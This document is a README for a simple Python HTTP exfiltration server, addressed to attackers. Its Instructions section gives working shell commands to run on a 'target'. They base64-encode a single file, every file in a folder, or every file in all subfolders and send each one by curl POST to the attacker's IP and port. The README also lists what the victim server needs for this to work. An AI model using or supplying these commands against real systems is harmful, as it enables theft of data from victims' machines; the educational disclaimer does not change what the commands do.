# Summary
Hello guys, here I share an basic Python script to use as an Exfiltration Server.<br>
Remember that this is not an professional tool, it's simple for fast usage.<br>
This script may be really noisy, so be sure that you already collected everything silent<br>
If you have an idea of adjusts, let me know! :)<br>

> [!!!] Please be informed that the script provided is solely for informational and educational purposes only.

# Instructions
1 - First of all, be sure of the port you want to open and edit on the server.py<br>
2 - Be sure that you are running the server using bash screen or tmux, to hold it opened<br>
3 - Run the command using Python3<br>
```bash
$ python3 server.py
```
4 - Now on the target, there are some ways to exfiltrate<br>

- Single File
```bash
$ cat file.txt | base64 -w 0 | curl -XPOST 'http://IP:PORT/post' --data-binary @-
```

- Multiple Files on the same folder
```bash
$ ls -p | grep -v / >> files_list
$ for x in $(cat files_list); do cat $x | base64 -w 0 | curl -XPOST 'http://IP:PORT/post' --data-binary @-; done
```

- Multiple Files on all the subfolders from the current dir
```bash
$ find ./ -type f >> files_list
$ for x in $(cat files_list); do cat $x | base64 -w 0 | curl -XPOST 'http://IP:PORT/post' --data-binary @-; done
```

# Requirements
Since we are talking of an HTTP Exfiltration, we should meet some requirements for the victim server:

- Free access to the internet
- No proxy (Some of them, may block)
- Curl installed